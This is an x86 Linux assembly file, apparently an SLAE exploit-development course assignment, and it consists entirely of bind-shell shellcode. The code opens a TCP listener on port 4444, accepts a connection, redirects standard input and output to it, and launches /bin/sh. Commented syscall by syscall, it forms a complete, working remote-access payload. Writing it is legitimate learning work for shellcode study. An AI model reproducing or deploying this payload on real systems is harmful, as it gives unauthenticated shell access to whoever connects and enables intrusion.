; Author: bigb0ss
; Student ID: SLAE-1542

global _start

section		.text

_start:

xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx

; 1) Socket Creation
; sockfd = socket(AF_INET, SOCK_STREAM, 0);

mov al, 0x66		; #define __NR_socketcall 102	--> Hex: 0x66
mov bl, 0x1		; #define SYS_SOCKET 1
push edx		; int protocol = 0
push ebx		; int SOCK_STREAM = 1
push 0x2		; int AF_INET = 2
mov ecx, esp		; Move stack pointer to ECX
int 0x80		; Execute SYS_SOCKET
mov edi, eax		; Save the sockfd to EDI

; 	struct sockaddr_in addr;
;	addr.sin_family = AF_INET; 
;	addr.sin_port = htons(port);	//4444
;	addr.sin_addr.s_addr = INADDR_ANY;

push edx		; NULL Padding
push edx		; NULL Padding
push edx		; sin_addr = 0.0.0.0
push word 0x5c11		; port = 4444
push word 0x2 		; int AF_INET = 2
mov esi, esp	; Move stack pointer to ESI

; 2) Bind
; bind(sockfd, (struct sockaddr *) &addr, sizeof(addr));

mov al, 0x66		; socketcall = 102
mov bl, 0x2		; #define SYS_BIND	2
push 0x10		; sizeof(addr) = 10
push esi		; ESI = Server Address stuct
push edi		; EDI = sockfd
mov ecx, esp		; Move stack pointer to ECX
int 0x80		; Execute SYS_BIND

; 3) Listen
; listen(sockfd, 0);

mov al, 0x66		; socketcall = 102
mov bl, 0x4		; #define SYS_LISTEN	4
push edx		; int backlog = 0
push edi		; EDI = sockfd
mov ecx, esp		; Move stack pointer to ECX
int 0x80		; Execute SYS_LISTEN

; 4) Accept
; acceptfd = accept(sockfd, NULL, NULL);

mov al, 0x66		; socketcall = 102
mov bl, 0x5		; #define SYS_ACCEPT	5
push edx		; NULL
push edx		; NULL
push edi		; EDI = sockfd
mov ecx, esp		; Move stack pointer to ECX
int 0x80		; Execute SYS_ACCEPT
mov edi, eax

; 5) Dup2 - Input and Output Redriection
; dup2(acceptfd, 0);	// stdin
; dup2(acceptfd, 1);	// stdout
; dup2(acceptfd, 2);	// stderr

xor ecx, ecx		; Zero out
mov cl, 0x3		; Set the counter 

loop:
xor eax, eax		; Zero out
mov al, 0x3f		; #define __NR_dup2	63  --> Hex: 0x3f
mov ebx, edi		; New sockfd
dec cl		; Decrementing the counter by 1
int 0x80		

jnz loop		; Jump back to the beginning of the loop until CL is set to zero flag

; 6) Execve
; execve("/bin/sh", NULL, NULL);

push edx		; NULL
push 0x68732f6e		; "hs/n"  <-- //bin/sh
push 0x69622f2f		; "ib//"
mov ebx, esp		; Move stack pointer to EBX
push edx		; NULL terminator
push ebx
mov ecx, esp		; Move stack pointer to ECX
mov al, 0xb		; #define __NR_execve	11  --> Hex: 0xb
int 0x80		; Execute SYS_EXECVE
